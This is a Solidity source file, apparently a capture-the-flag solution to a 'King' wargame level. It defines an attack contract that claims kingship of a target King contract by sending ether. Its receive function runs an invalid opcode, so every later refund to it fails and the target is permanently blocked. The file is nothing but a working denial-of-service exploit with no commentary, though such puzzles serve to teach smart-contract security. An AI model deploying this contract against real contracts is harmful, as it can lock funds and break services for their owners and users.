//SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.13;

import {King} from "./King.sol";

contract KingAttack {
    King public _king;

    constructor(King kingAddress) {
        _king = kingAddress;
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }

    function attack() external payable {
        _king.becameKing{value: msg.value}();
    }
}
